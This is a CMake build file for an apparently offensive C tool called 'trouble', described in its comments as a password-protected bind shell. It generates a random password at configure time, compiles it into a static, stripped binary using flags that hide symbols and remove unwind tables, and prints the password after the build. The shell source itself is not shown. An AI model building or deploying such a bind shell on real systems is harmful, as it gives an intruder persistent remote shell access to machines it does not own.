project(trouble C)
cmake_minimum_required(VERSION 3.0)

# This will create a 32 byte "password" for the bind shell. This command
# is only run when "cmake" is run, so if you want to generate a new password
# then "cmake ..; make" should be run from the command line.
exec_program("/bin/sh"
    ${CMAKE_CURRENT_SOURCE_DIR}
    ARGS "-c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'"
    OUTPUT_VARIABLE random_password )

# Pass the random password into ${PROJECT_NAME} as a macro
add_definitions(-Dpassword="${random_password}")

set(CMAKE_C_COMPILER musl-gcc)
set(CMAKE_C_FLAGS "-Wall -Wextra -Wshadow -s -fvisibility=hidden -O3 -funroll-loops -fno-asynchronous-unwind-tables -static -std=gnu11")
add_executable(${PROJECT_NAME} src/trouble.c)

# After the build is successful, display the random password to the user
add_custom_command(TARGET ${PROJECT_NAME} POST_BUILD
                   COMMAND ${CMAKE_COMMAND} -E echo
                   "The bind shell password is:" ${random_password})
